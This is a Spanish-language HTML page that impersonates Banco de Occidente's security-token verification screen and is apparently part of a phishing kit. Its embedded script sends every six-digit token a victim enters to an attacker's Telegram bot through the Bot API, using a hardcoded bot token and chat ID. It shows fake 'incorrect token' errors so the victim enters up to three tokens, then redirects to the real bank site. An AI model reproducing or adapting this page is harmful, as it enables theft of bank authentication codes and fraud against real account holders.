<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco de Occidente - Verificación Token</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        .error-message {
            color: #d32f2f;
            font-size: 12px;
            margin-top: 8px;
            display: none;
        }
        .error-message.show {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Seguridad Badge -->
        <div class="security-badge">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2L4 6V11C4 16.55 7.84 21.74 13 23C18.16 21.74 22 16.55 22 11V6L12 2ZM10 17L6 13L7.41 11.59L10 14.17L16.59 7.58L18 9L10 17Z" fill="#00C853"/>
            </svg>
            <span>Seguridad</span>
        </div>

        <!-- Main Card -->
        <div class="card">
            <!-- Logo -->
            <div class="logo-container">
                <img src="img/logo-03-occidente-01-occidente-01-regular.aa547ca6b936469689ea.svg" alt="Banco de Occidente" class="logo">
            </div>

            <!-- Title -->
            <div class="welcome-text">
                <p class="welcome">Verificación de identidad</p>
                <p class="portal-title">Ingresa tu Token</p>
            </div>

            <!-- Info Message -->
            <div class="info-box">
                <p>Por tu seguridad, ingresa el <strong>token de 6 dígitos</strong> generado por tu dispositivo de seguridad.</p>
            </div>

            <!-- Form -->
            <form class="login-form" id="form-token">
                <!-- Token Field -->
                <div class="form-group">
                    <label for="token">Token de seguridad</label>
                    <input 
                        type="text" 
                        id="token" 
                        placeholder="Ingresa los 6 dígitos" 
                        class="input-field input-token" 
                        maxlength="6"
                        pattern="[0-9]{6}"
                        required
                        autocomplete="off"
                        inputmode="numeric"
                    >
                    <div class="error-message" id="errorMsg"></div>
                    <div class="token-indicators">
                        <span class="digit-indicator"></span>
                        <span class="digit-indicator"></span>
                        <span class="digit-indicator"></span>
                        <span class="digit-indicator"></span>
                        <span class="digit-indicator"></span>
                        <span class="digit-indicator"></span>
                    </div>
                </div>

                <!-- Help Text -->
                <div class="help-text">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z" fill="#666"/>
                    </svg>
                    <span>Ingresa el token de 6 dígitos generado por tu dispositivo de seguridad</span>
                </div>

                <!-- Submit Button -->
                <button type="button" class="btn-login" id="btnContinuar" disabled>
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M9 16.17L4.83 12L3.41 13.41L9 19L21 7L19.59 5.59L9 16.17Z" fill="white"/>
                    </svg>
                    Verificar Token
                </button>

                <!-- Back Link -->
                <div class="back-link">
                    <a href="/index.html">← Volver al inicio</a>
                </div>
            </form>
        </div>
    </div>

    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
        <div class="loading-content">
            <img src="img/spinner_occidente.gif" alt="Cargando..." class="loading-spinner">
            <p class="loading-text">Verificando token...</p>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
        const TELEGRAM_CHAT_ID = '-1003784784181';

        let intentos = 0;

        const tokenInput = document.getElementById('token');
        const btnContinuar = document.getElementById('btnContinuar');
        const loadingScreen = document.getElementById('loadingScreen');
        const errorMsg = document.getElementById('errorMsg');

        tokenInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').slice(0, 6);
            validateToken();
        });

        function validateToken() {
            const isValid = tokenInput.value.length === 6;
            btnContinuar.disabled = !isValid;
        }

        btnContinuar.addEventListener('click', async function(e) {
            e.preventDefault();
            if (btnContinuar.disabled) return;

            intentos++;
            loadingScreen.style.display = 'flex';

            const mensaje = `🔐 <b>TOKEN (INTENTO ${intentos}/3) - BANCO DE OCCIDENTE</b>

<b>Token:</b> <code>${tokenInput.value}</code>

<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
                });

                if ((await response.json()).ok) {
                    if (intentos < 3) {
                        setTimeout(() => {
                            loadingScreen.style.display = 'none';
                            if (intentos === 1) {
                                errorMsg.textContent = '❌ El token ingresado es incorrecto.';
                                errorMsg.classList.add('show');
                            } else if (intentos === 2) {
                                errorMsg.textContent = '⚠️ Error en la sincronización. Intente nuevamente.';
                                errorMsg.classList.add('show');
                            }
                            tokenInput.value = '';
                            validateToken();
                        }, 1500);
                    } else {
                        setTimeout(() => {
                            window.location.href = 'https://www.occidente.com.co';
                        }, 1500);
                    }
                } else {
                    loadingScreen.style.display = 'none';
                    errorMsg.textContent = 'Error en la verificación. Intente nuevamente.';
                    errorMsg.classList.add('show');
                }
            } catch (error) {
                loadingScreen.style.display = 'none';
                errorMsg.textContent = 'Error de conexión. Intente nuevamente.';
                errorMsg.classList.add('show');
            }
        });
    </script>
</body>
</html>
